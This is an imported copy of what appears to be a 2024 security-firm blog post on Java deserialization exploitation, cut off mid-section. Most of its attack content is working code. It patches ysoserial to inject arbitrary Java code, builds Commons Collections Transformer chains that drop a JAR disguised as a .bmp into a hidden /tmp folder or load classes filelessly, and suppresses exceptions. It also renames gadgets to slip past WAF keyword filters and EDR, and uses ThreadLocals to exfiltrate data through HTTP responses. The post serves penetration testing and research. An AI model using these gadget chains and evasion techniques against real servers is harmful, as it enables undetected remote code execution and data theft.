---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-19_java-deserialization-tricks.md
original_filename: 2024-03-19_java-deserialization-tricks.md
title: Java Deserialization Tricks
category: documents
detected_topics:
- supply-chain
- command-injection
- sso
- idor
- mfa
- rate-limit
tags:
- imported
- documents
- supply-chain
- command-injection
- sso
- idor
- mfa
- rate-limit
language: en
raw_sha256: e409dc111cdb3d0826e33f8bb9048410f48208d52d06082cd12278a487e9e60e
text_sha256: a24f1aec912fed7bb25665f688cc1933aa7af5af35301072e596d6a691a56d9c
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Java Deserialization Tricks

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-19_java-deserialization-tricks.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, sso, idor, mfa, rate-limit
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `e409dc111cdb3d0826e33f8bb9048410f48208d52d06082cd12278a487e9e60e`
- Text SHA256: `a24f1aec912fed7bb25665f688cc1933aa7af5af35301072e596d6a691a56d9c`


## Content

---
title: "Java Deserialization Tricks"
page_title: "Java deserialization tricks"
url: "https://www.synacktiv.com/en/publications/java-deserialization-tricks.html"
final_url: "https://www.synacktiv.com/en/publications/java-deserialization-tricks.html"
authors: ["Clément Amic (@loadlow)"]
bugs: ["Insecure deserialization", "RCE", "Security code review"]
publication_date: "2024-03-19"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 373
---

# Java deserialization tricks

Written by Clément Amic \- 19/03/2024 - in Pentest \- [Download](java-deserialization-tricks#) __

During a red team engagement, we faced Java applications exposed on the internet and affected by arbitrary deserialization from user-supplied data. After quickly identifying a well-known gadget chain, we noticed that a WAF was rejecting requests exploiting the vulnerability by detecting specific patterns of the serialized chain, and that an EDR caught our first exploit. Moreover, firewalls were strictly filtering outbound traffic, including DNS. This article will present a few tricks regarding the gadgets that were used to exploit the same vulnerability on other similar targets, which allowed us to exfiltrate data from the compromised applications without being noticed.

Looking to improve your skills? Discover our **trainings** sessions! [Learn more](../offers/trainings). 

## Introduction

Arbitrary deserialization of untrusted data and Java gadget chains are already covered by the following articles:

  * [Finding gadgets like it's 2015](https://www.synacktiv.com/publications/finding-gadgets-like-its-2015-part-1) ([part 1](https://www.synacktiv.com/publications/finding-gadgets-like-its-2015-part-1), [part 2](https://www.synacktiv.com/publications/finding-gadgets-like-its-2015-part-2))
  * [Finding gadgets like it's 2022](https://www.synacktiv.com/publications/finding-gadgets-like-its-2022)
  * [Java Exploitation Restrictions in Modern JDK Times](https://codewhitesec.blogspot.com/2023/04/java-exploitation-restrictions-in.html)

This article will cover some tips and tricks that could be applied once a gadget chain leading to RCE (Remote Code Execution) has been identified on a vulnerable application, with the main objective being to make the exploit stealthier.

## Avoiding naive WAFs

First, as general advice, it is better to avoid being detected by static patterns. During engagements, we noticed WAFs (Web Application Firewalls) detecting specific words inside the serialized gadget chain, such as:

  * `Runtime`

  * `Process`

  * `exec`

  * `shell`

  * `ysoserial`

The first step is to recompile Java projects generating the gadget chains once the modules, packages and class names have been renamed. Then, the gadget chains should be slightly modified to avoid directly calling built-in classes or methods which are detected as they are commonly used, such as:
  
  
  Runtime.getRuntime().exec("whoami")

Additionally, strings used to create random class names using `JavaAssist` in [ysoserial](https://github.com/frohoff/ysoserial/blob/76ac2bb259995639f8bedaf4883465928e9586aa/src/main/java/ysoserial/payloads/util/Gadgets.java#L106) should not be forgotten as they could also be detected by security solutions:
  
  
  // src/main/java/ysoserial/payloads/util/Gadgets.java
  // [...]
  106  public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
  107  throws Exception {
  108  final T templates = tplClass.newInstance();
  // [...]
  122  clazz.setName("ysoserial.Pwner" + System.nanoTime()); //HERE
  123  CtClass superC = pool.get(abstTranslet.getName());
  124  clazz.setSuperclass(superC);
  // [...]
  133  // required to make TemplatesImpl happy
  134  Reflections.setFieldValue(templates, "_name", "Pwnr"); // HERE
  135  Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
  136  return templates;
  137  }
  // [...]

## Injecting custom classes at runtime

Nowadays, servers hosting application backends may often be monitored by an EDR (Endpoint Detection and Response), and child processes created from Java may raise alerts. As a result, basic payloads executing arbitrary commands will be detected. A simple method to avoid it would be to only inject Java code at runtime that performs the required operations, such as reading and writing to files, or exploiting services reachable from the underlying server.

### From the Translet API

Usually, the [ysoserial](https://github.com/frohoff/ysoserial) tool can be used to generate gadget chains, and almost all the known chains use the same last part: serializable classes which are inside the JDK internal modules and offer powerful primitives. Indeed, the `java.xml` __ internal module contains an [XSLT compiler](https://xml.apache.org/xalan-j/xsltc/xsltc_trax.html) (`Translet` API and `TrAX`), in the `com.sun.org.apache.xalan` __ package that somehow has the capability to inject Java classes at runtime from their bytecode. Moreover, this code is reachable from a simple [_getter_](https://github.com/openjdk/jdk/blob/94b50b714a3d7696908e13b44eceeec60b82fcc6/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java#L606) which is the key component of several gadget chains, such as [CommonsBeanutils1](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java#L31C48-L31C48).

These gadget chains would generally achieve arbitrary code execution by loading a custom class at runtime, which contains a static initialization block where arbitrary Java code is executed during the class initialization. The easiest way to inject custom Java code at runtime from this API, instead of directly running plain shell commands, is to slightly modify the [Gadgets](https://github.com/frohoff/ysoserial/blob/76ac2bb259995639f8bedaf4883465928e9586aa/src/main/java/ysoserial/payloads/util/Gadgets.java#L106) class of [ysoserial](https://github.com/frohoff/ysoserial). For example, the following patch could be applied to directly supply Java code on the tool arguments:
  
  
  diff --git a/src/main/java/ysoserial/payloads/util/Gadgets.java b/src/main/java/ysoserial/payloads/util/Gadgets.java
  index d4cd783..100a32a 100644
  --- a/src/main/java/ysoserial/payloads/util/Gadgets.java
  +++ b/src/main/java/ysoserial/payloads/util/Gadgets.java
  @@ -103,7 +103,7 @@ public class Gadgets {
  }
  
  
  -  public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
  +  public static <T> T createTemplatesImpl ( final String code, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
  throws Exception {
  final T templates = tplClass.newInstance();
  
  @@ -114,10 +114,7 @@ public class Gadgets {
  final CtClass clazz = pool.get(StubTransletPayload.class.getName());
  // run command in static initializer
  // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
  -  String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
  -  command.replace("\\", "\\\\").replace("\"", "\\\"") +
  -  "\");";
  -  clazz.makeClassInitializer().insertAfter(cmd);
  +  clazz.makeClassInitializer().insertAfter(code);
  // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
  clazz.setName("ysoserial.Pwner" + System.nanoTime());
  CtClass superC = pool.get(abstTranslet.getName());
  

However, this API could also be used to make the `Template` class define several classes, which could be more convenient as this would allow implementing interfaces required to interact with specific classes, for post-exploitation purposes or to persist at runtime. This should work as long as the dependencies used by such classes are already loaded at runtime, such as the Spring web framework for instance.

Indeed, the [TemplatesImpl](https://github.com/openjdk/jdk/blob/94b50b714a3d7696908e13b44eceeec60b82fcc6/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java#L516) class can be used to define several classes in a raw, from the `_bytecodes` field:
  
  
  // src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java
  // [...]
  454  /**
  455  * Defines the translet class and auxiliary classes.
  456  * Returns a reference to the Class object that defines the main class
  457  */
  458  private void defineTransletClasses()
  459  throws TransformerConfigurationException {
  // [...]
  467  TransletClassLoader loader =
  468  AccessController.doPrivileged(new PrivilegedAction<TransletClassLoader>() {
  469  public TransletClassLoader run() {
  470  return new TransletClassLoader(ObjectFactory.findClassLoader(),
  471  _tfactory.getExternalExtensionsMap());
  472  }
  473  });
  // [...]
  516  for (int i = 0; i < classCount; i++) {
  517  _class[i] = loader.defineClass(_bytecodes[i], pd);
  518  final Class<?> superClass = _class[i].getSuperclass();
  519	
  520  // Check if this is the main class
  521  if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
  522  _transletIndex = i;
  523  }
  524  else {
  525  _auxClasses.put(_class[i].getName(), _class[i]);
  526  }
  527  }
  // [...]
  542  }
  // [...]

Importing a JAR file while generating the `TemplatesImpl` instance can be performed by adding the following snippet inside the [Gadgets](https://github.com/frohoff/ysoserial/blob/76ac2bb259995639f8bedaf4883465928e9586aa/src/main/java/ysoserial/payloads/util/Gadgets.java#L106) class of [ysoserial](https://github.com/frohoff/ysoserial):
  
  
  // [...]
  private static <T> T createClassTemplatesImplFromJar(final String jarFilePath, Class<T> tplClass, 
  Class<?> abstTranslet, Class<?> transFactory) throws Exception {
  final T templates = tplClass.newInstance();
  
  JarFile jarFile = new JarFile(new File(jarFilePath), false);
  String mainClass = jarFile.getManifest().getMainAttributes().getValue("Main-Class");
  if(mainClass == null)
  throw new IllegalArgumentException("No Main-Class manifest value found.");
  mainClass = mainClass.replace("\\", "\\\\")
  .replace("\"", "\\\"");
  
  // use template gadget class
  ClassPool pool = ClassPool.getDefault();
  pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
  pool.insertClassPath(new ClassClassPath(abstTranslet));
  final CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName());
  // run main method of main-class in static initializer
  String initializer = "Class.forName(\""+mainClass+"\")" +
  ".getMethod(\"main\", new Class[]{String[].class})" +
  ".invoke(null, new Object[]{new String[0]});";
  clazz.makeClassInitializer().insertAfter(initializer);
  // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
  clazz.setName("ysoserial.Pwner" + System.nanoTime());
  CtClass superC = pool.get(abstTranslet.getName());
  clazz.setSuperclass(superC);
  
  // create bytecodes from .class files
  List<byte[]> bytecodesList = new ArrayList<>();
  for (Enumeration<JarEntry> en = jarFile.entries(); en.hasMoreElements(); ) {
  JarEntry entry = en.nextElement();
  if(!entry.getName().endsWith(".class")) continue;
  
  InputStream is = jarFile.getInputStream(entry);
  bytecodesList.add(IOUtils.readFully(is, (int) entry.getSize()));
  }
  final byte[][] bytecodes = new byte[bytecodesList.size() + 2][];
  int i = 0;
  for (byte[] code : bytecodesList) {
  bytecodes[i] = code;
  ++i;
  }
  bytecodes[i++] = clazz.toBytecode();
  bytecodes[i] = ClassFiles.classAsBytes(Gadgets.Foo.class);
  
  // inject class bytes into instance
  Reflections.setFieldValue(templates, "_bytecodes", bytecodes);
  
  // required to make TemplatesImpl happy
  Reflections.setFieldValue(templates, "_name", "Pwnr");
  Reflections.setFieldValue(templates, "_tfactory", transFactory
  .newInstance());
  return templates;
  }
  
  public static Object createClassTemplatesImplFromJar(final String jarFilePath) throws Exception {
  return createClassTemplatesImplFromJar(jarFilePath, 
  TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
  }
  // [...]

The `createClassTemplatesImplFromJar` method can then be used to generate the `TemplateImpl` instance on existing gadgets when needed.

However, injecting an entire JAR file twice would have no effect as the same classes will not be defined twice in the same `ClassLoader` and the first version of each class will be kept. Additionally, one should take care of `OutOfMemory` exceptions raised when the `PermGen` memory area is full, [as mentioned](https://github.com/frohoff/ysoserial/blob/76ac2bb259995639f8bedaf4883465928e9586aa/src/main/java/ysoserial/payloads/util/Gadgets.java#L121) by the ysoserial author [frohoff](https://github.com/frohoff), that could occur when defining a lot of new classes. 

### From CommonsCollections Transformer chains

Other gadget chains exploit different powerful primitives offered by permissive libraries, such as [CommonsCollections](https://github.com/frohoff/ysoserial/blob/f2ea3ae83a6371aaa8c0b54ecbf8ed5957c3b840/src/main/java/ysoserial/payloads/CommonsCollections7.java#L46) with `Transformer` chains. If the targeted application has a vulnerable `CommonsCollections` dependency, it could be exploited without relying on the internal `Translets`, which can be removed from specific Java runtimes, or cannot be used from unnamed modules since JDK 16, as explained in [this great article](https://codewhitesec.blogspot.com/2023/04/java-exploitation-restrictions-in.html) from CODE WHITE.

Unfortunately during our engagement, the internal `Translets` were not reachable from the vulnerable applications so we used one of the techniques described below.

Depending on the context, two methods can be used. The first one uses `URLClassLoader` and is not file-less, whereas the other one uses another internal class but is file-less. However, both methods could be limited if the application is running within a [Java Security Manager](https://docs.oracle.com/cd/E13222_01/wls/docs81b/secmanage/java.html).

Existing `CommonsCollections` gadgets already use `Transformer` chains, mainly to [inject a custom class using Translets](https://github.com/frohoff/ysoserial/blob/028ee30e9c04530986b55884a130298bca31505f/src/main/java/ysoserial/payloads/CommonsCollections2.java#L33), or to [execute arbitrary commands](https://github.com/frohoff/ysoserial/blob/028ee30e9c04530986b55884a130298bca31505f/src/main/java/ysoserial/payloads/CommonsCollections1.java#L55):
  
  
  // src/main/java/ysoserial/payloads/CommonsCollections1.java
  // [...]
  public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
  
  public InvocationHandler getObject(final String command) throws Exception {
  final String[] execArgs = new String[] { command };
  // inert chain for setup
  final Transformer transformerChain = new ChainedTransformer(
  new Transformer[]{ new ConstantTransformer(1) });
  // real chain for after setup
  final Transformer[] transformers = new Transformer[] {
  new ConstantTransformer(Runtime.class),
  new InvokerTransformer("getMethod", new Class[] {
  String.class, Class[].class }, new Object[] {
  "getRuntime", new Class[0] }),
  new InvokerTransformer("invoke", new Class[] {
  Object.class, Object[].class }, new Object[] {
  null, new Object[0] }),
  new InvokerTransformer("exec",
  new Class[] { String.class }, execArgs),
  new ConstantTransformer(1) };
  
  final Map innerMap = new HashMap();
  // [...]
  Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
  return handler;
  }
  // [...]
  }

These chains allow performing several powerful operations, by combining several [`Transformer` functors](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/package-summary.html):

  * Define constants made of serializable types or scalars, by using a `ConstantsTransformer`:

  
  
  new ConstantTransformer(File.class);

  * Iterate over several `Transformers` with a `ChainedTransformer`, by providing, as the first parameter of the next `Transformer`, the result of the previous `Transformer`.
  * Call an arbitrary method of an existing class, by using an `InvokerTransformer`. This also works for static methods, but requires calling `getMethod` to lookup the static method to invoke:

  
  
  new Transformer[] {
  new ConstantTransformer(Runtime.class),
  new InvokerTransformer("getMethod", new Class[] {
  String.class, Class[].class }, new Object[] {
  "getRuntime", new Class[0] })
  };

  * Instantiate a class, by using an `InstantiateTransformer`:

  
  
  new Transformer[] {
  new ConstantTransformer(File.class),
  new InstantiateTransformer(
  new Class[]{String.class},
  new Object[]{"/etc/passwd"}
  ),
  };

  * Iterate over several `Transformers`, by keeping the same first parameter. To do so, a `ClosureTransformer`, should be parameterized with a `ChainedClosure`, itself parameterized with a `TransformerClosure` array. This construct allows multiple methods to be called on a single instance if it is included inside a main `ChainedTransformer`. Closures are useful, for example, to make a static field or method accessible (i.e. to make it `public` even if its visibility was initially `protected` or `private`), and then, to get or invoke it:

  
  
  new Transformer[] {
  new ConstantTransformer(Class.forName("sun.misc.Unsafe")),
  new InvokerTransformer("getDeclaredField",
  new Class[]{ String.class },
  new Object[]{"theUnsafe"}
  ),
  new ClosureTransformer(new TransformerClosure(new InvokerTransformer(
  "setAccessible",
  new Class[]{ boolean.class },
  new Object[]{ true }
  ))),
  new InvokerTransformer("get",
  new Class[]{ Object.class },
  new Object[]{ null }
  ) 
  };

There are also functors that provide control-flow capabilities (e.g. `IfClosure`, `ForClosure`, `SwitchTransformer`, `WhileClosure`).

The only limitation of these chains is that it is not possible to provide non-serializable parameters to the methods or to the constructors.

#### Instantiating URLClassLoader from Transformers

This kind of chains can be modified to actually write a new JAR file on disk, then load a class from it using an `URLClassLoader`, and to delete the file.

For example, the following chain will create a folder in `/tmp/`, store the JAR file inside it, and load a class from it:
  
  
  String uniqueKey = System.nanoTime() + "";
  String mainClassName = "TestClass" + uniqueKey;
  byte[] jarBytes = FileUtils.readFileToByteArray(new File(jarFilePath));
  
  final Transformer[] transformers = new Transformer[]{
  // create a temp folder
  new ConstantTransformer(File.class),
  new InstantiateTransformer(
  new Class[]{String.class},
  new Object[]{"/tmp/.cache_" + uniqueKey + "/"}
  ),
  new InvokerTransformer("mkdirs",
  new Class[]{}, new Object[]{}),
  
  // write the JAR file in it
  new ConstantTransformer(FileOutputStream.class),
  new InstantiateTransformer(
  new Class[]{String.class},
  new Object[]{"/tmp/.cache_" + uniqueKey + "/save.bmp"}
  ),
  new InvokerTransformer("write",
  new Class[]{byte[].class}, new Object[]{jarBytes}),
  
  // create the URLClassLoader, load the class, and instantiate it
  new ConstantTransformer(URLClassLoader.class),
  new InstantiateTransformer(new Class[]{
  URL[].class}, new Object[]{new URL[]{
  new URL("file:///tmp/.cache_" + uniqueKey + "/save.bmp")}}
  ),
  new InvokerTransformer("loadClass",
  new Class[]{String.class}, new Object[]{mainClassName}),
  new InstantiateTransformer(
  new Class[]{},
  new Object[]{}
  ),
  
  // delete the JAR file
  new ConstantTransformer(File.class),
  new InstantiateTransformer(
  new Class[]{String.class},
  new Object[]{"/tmp/.cache_" + uniqueKey + "/save.bmp"}
  ),
  new InvokerTransformer("delete",
  new Class[]{}, new Object[]{}),
  
  // delete the folder
  new ConstantTransformer(File.class),
  new InstantiateTransformer(
  new Class[]{String.class},
  new Object[]{"/tmp/.cache_" + uniqueKey + "/"}
  ),
  new InvokerTransformer("delete",
  new Class[]{}, new Object[]{}),
  };
  

#### Calling Unsafe from Transformers

A chain can be created to define an anonymous class using `sun.misc.Unsafe`. This only allows defining a single class at a time, but can be useful as it is file-less. Moreover, this single class could be used to implement a custom `ClassLoader` that would define all the required classes later.

The following chain sets the `theUnsafe` field accessible using a `Closure`, retrieves its value, calls the `defineAnonymousClass` method on it, and creates a new instance of the returned class:
  
  
  byte[] classBytes = FileUtils.readFileToByteArray(new File("CustomClass.class"));
  new Transformer[]{
  new ConstantTransformer(Class.forName("sun.misc.Unsafe")),
  new InvokerTransformer("getDeclaredField",
  new Class[]{ String.class },
  new Object[]{"theUnsafe"}
  ),
  new ClosureTransformer(new TransformerClosure(new InvokerTransformer(
  "setAccessible",
  new Class[]{ boolean.class },
  new Object[]{ true }
  ))),
  new InvokerTransformer("get",
  new Class[]{ Object.class },
  new Object[]{ null }
  ),
  new InvokerTransformer("defineAnonymousClass",
  new Class[]{ Class.class, byte[].class, Object[].class },
  new Object[] { String.class, classBytes, new Object[0] }
  ),
  new InvokerTransformer("newInstance",
  new Class[0], new Object[0]
  )
  };

#### Instantiating ByteArrayClassLoader from Transformers

The `ByteArrayClassLoader` class from the [byte-buddy](https://github.com/raphw/byte-buddy/) dependency is also helpful in defining arbitrary classes, because it offers a custom public `ClassLoader` which can be used without patching fields:
  
  
  Map<String, byte[]> defs = new HashMap<>();
  defs.put("SampleClass", Files.readAllBytes(Path.of("SampleClass.class")));
  
  new ByteArrayClassLoader(null, definitions)
  .loadClass("SampleClass")
  .newInstance();

Or as follows, inside a `Transformer` chain:
  
  
  HashMap<String, byte[]> defs = new HashMap<>();
  defs.put("SampleClass", FileUtils.readFileToByteArray(new File("SampleClass.class")));
  
  new Transformer[]{
  new ConstantTransformer(Class.forName("net.bytebuddy.dynamic.loading.ByteArrayClassLoader")),
  new InstantiateTransformer(
  new Class[]{ ClassLoader.class, Map.class },
  new Object[] { null, defs }
  ),
  new InvokerTransformer("loadClass",
  new Class[]{ String.class },
  new Object[]{ "SampleClass" }
  ),
  new InvokerTransformer("newInstance",
  new Class[0], new Object[0]
  )
  };

However, is this dependency frequently used? It seems it is [included](https://mvnrepository.com/artifact/net.bytebuddy/byte-buddy/usages) in some projects:

  * [Selenium Java](https://mvnrepository.com/artifact/org.seleniumhq.selenium/selenium-java)
  * [Hibernate Core](https://mvnrepository.com/artifact/org.hibernate/hibernate-core)
  * [HikariCP](https://github.com/brettwooldridge/HikariCP/blob/dev/pom.xml) (if the `Hibernate-Core` optional dependency is enabled)

## Making gadgets stealthier

Most gadgets will trigger exceptions if they are not properly built. To make payloads stealthier, it is necessary to deeply understand the code flow to make the process of gadget deserialization going smooth, and error logs empty.

### Translets

When gadgets generated using ysoserial are deserialized, the following exception is thrown just after defining the new arbitrary class:
  
  
  Caused by: java.lang.NullPointerException: null
  at java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:375) ~[na:na]
  at java.xml/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:557) ~[na:na]
  at java.xml/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:584) ~[na:na]
  | 	... 120 common frames omitted
  

This exception is actually thrown from the [`postInitialization`](https://github.com/openjdk/jdk/blob/94b50b714a3d7696908e13b44eceeec60b82fcc6/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet.java#L375) method of the `AbstractTranslet` class:
  
  
  // src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet.java
  // [...]
  public final void postInitialization() {
  if (this.transletVersion < 101) {
  int arraySize = this.namesArray.length;// Exception thrown here
  String[] newURIsArray = new String[arraySize];
  String[] newNamesArray = new String[arraySize];
  int[] newTypesArray = new int[arraySize];
  // [...]
  this.namesArray = newNamesArray;
  this.urisArray = newURIsArray;
  this.typesArray = newTypesArray;
  }
  
  if (this.transletVersion > 101) {
  BasisLibrary.runTimeError("UNKNOWN_TRANSLET_VERSION_ERR", this.getClass().getName());
  }
  
  }
  // [...]

In order to avoid this error, one of the following statements can be added to the custom `Translet` constructor:

  * Initializing the `namesArray` field with an empty array:

  
  
  clazz.getConstructors()[0].setBody("this.namesArray = new String[0];");

  * Setting the `transletVersion` field to more than `100`:

  
  
  clazz.getConstructors()[0].setBody("this.transletVersion = 101;");

It should also be noted that when internal modules are used, recent JVMs will complain the first time an internal module is accessed from an unnamed module:
  
  
  WARNING: An illegal reflective access operation has occurred
  WARNING: Illegal reflective access by org.apache.commons.collections4.functors.InvokerTransformer (jar:file:app.jar!/BOOT-INF/lib/commons-collections4-4.0.jar!/) to method com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()
  WARNING: Please consider reporting this to the maintainers of org.apache.commons.collections4.functors.InvokerTransformer
  WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
  WARNING: All illegal access operations will be denied in a future release
  

This message is written to `stderr` by default and could be avoided by closing `stderr`, but we did not find methods that could be used to hide it completely. Nonetheless, this it is often displayed legitimately when complex Java applications are starting.

### CommonsCollections

In order not to throw exceptions because the last element returned from `Transformer` chains is not `Comparable`, `CommonsCollections` gadgets could be modified to return a constant `String`:
  
  
  public class CommonsCollections2 implements ObjectPayload<Serializable> {
  
  public Serializable getObject(final String javaClassPath) throws Exception {
  // [...]
  ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
  transformer,
  new ConstantTransformer("") // HERE
  /* Always return a String at the end,
  * which is a base type and
  * is Comparable (removes all thrown exceptions)
  */
  });
  // [...]
  }
  

### CommonsBeanutils1

Once the [getOutputProperties](https://github.com/openjdk/jdk/blob/94b50b714a3d7696908e13b44eceeec60b82fcc6/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java#L606) method of the `TemplatesImpl` internal class has been called by the `BeansComparator` created for the [CommonsBeanutils1](https://github.com/frohoff/ysoserial/blob/028ee30e9c04530986b55884a130298bca31505f/src/main/java/ysoserial/payloads/CommonsBeanutils1.java#L22) gadget chain, an exception is thrown because the returned objects do not implement the `Comparable` interface.

In order to suppress such exceptions, an instance of the serializable and internal [NullComparator](https://github.com/openjdk/jdk/blob/115b0744c6ba8d990eef5a31d64d6a184182c754/src/java.base/share/classes/java/util/Comparators.java#L64) class can be provided to the `BeansComparator` constructor:
  
  
  public class CommonsBeanutils1 implements ObjectPayload<Object> {
  
  public Object getObject(final String filePath) throws Exception {
  final Object templates = Gadgets.createClassTemplatesImplFromJar(filePath);
  
  //NullComparator implements Comparator<?> and Serializable
  Constructor<?> nullComparatorConstructor = Reflections
  .getFirstCtor("java.util.Comparators$NullComparator");
  Comparator<?> nullComparator = (Comparator<?>) nullComparatorConstructor
  .newInstance(true, null);
  
  // mock method name until armed
  final BeanComparator comparator = new BeanComparator("lowestSetBit", nullComparator);
  // [...]
  }

As this comparator does not attempt to cast elements to `Comparable`, no exception will be thrown during the deserialization process.

### Enclosing gadgets inside a real Object

Once the final gadget is constructed (e.g. inside `CommonsCollections4.java::getObject`), it is possible to hide the gadget chain inside an instance of any class.

For example, if the underlying application expects a specific `Serializable` type, it is possible to redeclare it and add an internal `Object` field which will contain the gadget, because there are no constraint on it (see [FieldValues](https://github.com/openjdk/jdk/blob/115b0744c6ba8d990eef5a31d64d6a184182c754/src/java.base/share/classes/java/io/ObjectInputStream.java#L2585) implementation).

For example, if an application has the following vulnerable code:
  
  
  CustomResult res = (CustomResult)ois.readObject();
  System.out.println(res.result+1);

With the following `CustomResult` class:
  
  
  package my.app;
  
  class CustomResult {
  public final int result;
  public CustomResult(int res) {this.result = res;}
  }
  

It is possible to redeclare the same class manually on the Java project that generates the gadget chain (e.g. inside ysoserial) to add an arbitrary object that will include the gadget to trigger the chain (the constructor is only used on the project generating the serialized chain), as long as the same `serialVersionUID` is defined:
  
  
  package my.app;
  
  class CustomResult implements Serializable {
  private final long serialVersionUID = XL; //needs to be adapted from the existing generated UID
  private Object ignoredObject;
  
  public final int result;
  
  public CustomResult(Object gadget) {
  this.result = 1337;
  this.ignoredObject = gadget;
  }
  }
  

Then, the `return` statement of an existing gadget chain just has to be modified:
  
  
  public Object getObject(final String arg) throws Exception {
  // [...]
  // create queue with numbers and basic comparator
  final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(chain));
  // stub data for replacement later
  queue.add(1);
  queue.add(1);
  // [...]
  return new my.app.CustomResult(queue); // HERE
  }

Once generated and sent to the application, the serialized gadget chain should trigger and no exception should be raised by the application, as an instance of the expected type is received.

## Exfiltrating data

As outgoing connections and DNS requests may be filtered, it is better to find methods that would allow exfiltrating data from the compromised applications.

These methods generally reuse the web application's environment to return data in the response related to the current HTTP request. Web environments vary depending on the targeted application, but common ones include:

  * Javax Faces
  * Spring

In order to find such methods, the following generic approach can be adopted:

  * Read the web framework's documentation, as well as the one of the embedded web server.
  * Read their source code or analyze their JAR files in order to find how the current HTTP request and its response are handled and stored.
  * Analyze references stored on the current thread. In Java, the current [thread](https://docs.oracle.com/javase/8/docs/api/java/lang/Thread.html) usually [holds](https://hg.openjdk.org/jdk8/jdk8/jdk/file/tip/src/share/classes/java/lang/Thread.java#l180) the current state of web applications on a [ThreadLocal](https://hg.openjdk.org/jdk8/jdk8/jdk/file/tip/src/share/classes/java/lang/ThreadLocal.java) map. Variables stored inside it are named `ThreadLocals`.

### Analyzing ThreadLocals

In order to analyze `ThreadLocals` stored on the current thread, specific fields should be set accessible (i.e `public`) using the `Reflection` API. Then, the `ThreadLocalMap` entries could be enumerated:
  
  
  Thread t = Thread.currentThread();
  java.lang.reflect.Field fThreadLocals = Thread.class
  .getDeclaredField("threadLocals");
  fThreadLocals.setAccessible(true);
  
  java.lang.reflect.Field fTable = Class
  .forName("java.lang.ThreadLocal$ThreadLocalMap")
  .getDeclaredField("table");
  fTable.setAccessible(true);
  
  if(fThreadLocals.get(t) == null) return;
  
  Object table = fTable.get(fThreadLocals.get(t));
  java.lang.reflect.Field fValue = Class
  .forName("java.lang.ThreadLocal$ThreadLocalMap$Entry")
  .getDeclaredField("value");
  fValue.setAccessible(true);
  
  int length = java.lang.reflect.Array.getLength(table);
  for (int i=0; i < length; ++i) {
  Object entry = java.lang.reflect.Array.get(table, i);
  if(entry == null) continue;
  Object value = fValue.get(entry);
  if(value == null) continue;
  if (value instanceof java.lang.ref.WeakReference) {
  value = ((java.lang.ref.WeakReference) value).get();
  }
  if(value == null) continue;
  if (value instanceof java.lang.ref.SoftReference) {
  value = ((java.lang.ref.SoftReference) value).get();
  }
  if(value == null) continue;
  System.out.println(value.getClass() + " => " + value.toString());
  }
  

If the previous snippet is executed on a Javax Faces application, the following `ThreadLocals` are printed:
  
  
  class com.sun.faces.context.FacesContextImpl => com.sun.faces.context.FacesContextImpl@48ba57c4
  class com.sun.faces.context.FacesContextImpl => com.sun.faces.context.FacesContextImpl@48ba57c4
  class java.util.concurrent.ThreadLocalRandom => java.util.concurrent.ThreadLocalRandom@3b04c8e9
  class com.sun.faces.application.ApplicationAssociate => com.sun.faces.application.ApplicationAssociate@37225744
  class java.lang.StringCoding$StringDecoder => java.lang.StringCoding$StringDecoder@41d82a29
  class sun.nio.cs.UTF_8$Encoder => sun.nio.cs.UTF_8$Encoder@693220b9
  class java.lang.StringCoding$StringEncoder => java.lang.StringCoding$StringEncoder@5a0287a3
  class com.sun.xml.internal.stream.util.BufferAllocator => com.sun.xml.internal.stream.util.BufferAllocator@36bf1523

The first two entries are related to the internal state of the request currently processed ([FacesContextImpl](https://github.com/eclipse-ee4j/mojarra/blob/350fbbea7fe3b2c02eb416934cdebb2c0f9830da/impl/src/main/java/com/sun/faces/context/FacesContextImpl.java)), which is a good entry point to interact with the internal web API. Although these entries can be used to obtain references to the current state in a generic way, static methods could exist to obtain the same state, depending on the web framework.

### In Javax Faces

In this web framework, a [static method](https://docs.oracle.com/javaee/7/api/javax/faces/context/FacesContext.html#getCurrentInstance--) allows retrieving the current state of the application from `ThreadLocals`:
  
  
  // src/main/java/javax/faces/context/FacesContext.java
